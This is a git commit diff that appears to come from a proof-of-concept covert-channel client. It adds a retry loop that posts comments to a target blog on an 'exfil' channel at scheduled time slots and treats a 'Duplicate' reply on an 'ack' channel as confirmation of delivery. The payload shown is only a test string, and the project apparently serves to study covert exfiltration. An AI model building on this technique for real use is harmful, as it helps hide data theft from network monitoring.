bc4b10a2127d58c8ffce01e8f83911282a85db2f
accidentalrebel <accidentalrebel@gmail.com>
2021-08-13 19:18:37 +0800

    Can check.

--- src/client.py
+++ src/client.py
@@ -16,17 +16,21 @@ ack_channel_id = 7
 send_time_slot = "1:11"
 confirm_time_slot = "3:33"
 
-delay_to_timeslot(send_time_slot)
+while True:
+    delay_to_timeslot(send_time_slot)
 
-print("Triggered at: " + str(datetime.datetime.now().time()))
+    print("Triggered at: " + str(datetime.datetime.now().time()))
 
-message_id = generate_random_string(10)
-response = submit_comment(target_blog, exfil_channel_id, message_id + ": Exfiltrated Data Test")
-print(response.html_response)
+    message_id = generate_random_string(10)
+    response = submit_comment(target_blog, exfil_channel_id, message_id + ": Exfiltrated Data Test")
+    print(response.html_response)
 
-delay_to_timeslot(confirm_time_slot)
-response = response = submit_comment(target_blog, ack_channel_id, message_id)
-print("## html_response: " + str(response.html_response))
-if "Duplicate" in response.html_response:
-    print("## DUPLICATE. Which means it was acknowledged!")
-
+    delay_to_timeslot(confirm_time_slot)
+    response = response = submit_comment(target_blog, ack_channel_id, message_id)
+    print("## html_response: " + str(response.html_response))
+    if "Duplicate" in response.html_response:
+        # If it's duplicated, that means that the server successfully got the message.
+        print("[INFO] Message submitted and confirmed.")
+        break
+    else:
+        print("[INFO] Message was not received by server. Resending...")
